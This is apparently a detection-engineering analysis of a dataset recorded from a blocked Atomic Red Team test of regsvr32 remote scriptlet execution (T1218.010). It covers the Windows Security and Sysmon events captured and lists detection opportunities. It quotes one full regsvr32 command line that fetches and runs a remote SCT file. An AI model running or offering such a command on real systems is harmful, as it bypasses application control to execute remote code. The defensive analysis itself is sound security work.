# T1218.010-2: Regsvr32 — Regsvr32 remote COM scriptlet execution

## Technique Context

T1218.010 (Regsvr32) is a defense evasion technique where attackers abuse the legitimate regsvr32.exe utility to bypass application control mechanisms and execute malicious code. This technique is particularly valuable because regsvr32 is a signed Microsoft binary that can load and execute COM scriptlets (SCT files) from remote URLs, effectively bypassing many endpoint security controls that focus on unsigned or suspicious executables.

The detection community focuses heavily on regsvr32 command-line arguments, especially when combined with network connectivity. Key indicators include the `/s` (silent), `/u` (unregister), and `/i:` (specify URL) parameters, particularly when the URL parameter points to external resources or suspicious domains. The technique is commonly used in initial access scenarios and as part of multi-stage attack chains.

## What This Dataset Contains

This dataset captures a Windows Defender-blocked attempt at regsvr32 remote COM scriptlet execution. The core evidence appears in Security event 4688, showing cmd.exe execution with the command line: `"cmd.exe" /c C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll`. The Security event 4689 shows this cmd.exe process exiting with status 0xC0000022 (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the execution.

The process chain begins with powershell.exe (PID 41688) spawning cmd.exe (PID 33528), which was intended to execute regsvr32. Sysmon captures the initial PowerShell process startup with extensive image load events (EID 7) showing .NET runtime components, Windows Defender DLLs (MpOAV.dll, MpClient.dll), and urlmon.dll loading. A whoami.exe process (PID 7932) executes successfully, captured in both Sysmon EID 1 and Security EID 4688/4689 events.

Notably, Sysmon EID 8 captures a CreateRemoteThread event from powershell.exe targeting an unknown process (PID 33528), and EID 10 shows process access from PowerShell to whoami.exe with full access rights (0x1FFFFF).

## What This Dataset Does Not Contain

Most critically, this dataset contains no regsvr32.exe process creation events because Windows Defender blocked the execution before regsvr32 could start. There are no network connection events (Sysmon EID 3) showing attempts to fetch the remote SCT file from the GitHub URL. The sysmon-modular configuration's include-mode filtering for ProcessCreate means cmd.exe creation isn't captured in Sysmon EID 1, though it appears in Security 4688.

The PowerShell script block logging (EID 4104) contains only test framework boilerplate with Set-StrictMode commands rather than the actual test execution content. No DNS queries (Sysmon EID 22) are present, and there are no file creation events related to temporary SCT files that would normally be downloaded and executed.

## Assessment

This dataset provides excellent telemetry for detecting attempted regsvr32 abuse, even when blocked by endpoint protection. The Security 4688 event with full command-line logging captures the complete attack pattern including suspicious parameters and external URL. The 0xC0000022 exit status in Security 4689 clearly indicates security software intervention.

The Sysmon telemetry adds valuable context around the PowerShell execution environment and process relationships, though the lack of actual regsvr32 execution limits its utility for studying the full technique lifecycle. The dataset would be stronger with network telemetry showing DNS resolution attempts and connection failures, but the current telemetry effectively demonstrates how modern endpoint protection can prevent this technique while still generating detectable artifacts.

## Detection Opportunities Present in This Data

1. **Regsvr32 Command Line Analysis**: Monitor Security 4688 events for regsvr32.exe with `/i:` parameter pointing to external URLs, especially combined with `/s` and `/u` flags.

2. **Process Exit Status Monitoring**: Alert on processes terminating with 0xC0000022 (STATUS_ACCESS_DENIED) exit codes, particularly for LOLBins like regsvr32, indicating security software blocked execution.

3. **PowerShell to CMD Chain**: Detect PowerShell spawning cmd.exe processes that attempt to execute regsvr32 with network-based parameters.

4. **Suspicious Image Loads**: Monitor for urlmon.dll loading in PowerShell processes, which may indicate preparation for network-based COM object execution.

5. **Process Access Patterns**: Alert on PowerShell processes accessing newly created processes with excessive permissions (0x1FFFFF), which may indicate process injection or manipulation attempts.

6. **Remote Thread Creation**: Monitor Sysmon EID 8 events from PowerShell targeting unknown or short-lived processes, potentially indicating injection into blocked execution attempts.

7. **Failed Network Activity Correlation**: Correlate failed process execution (exit code 0xC0000022) with expected network indicators like DNS queries to external domains containing SCT files.
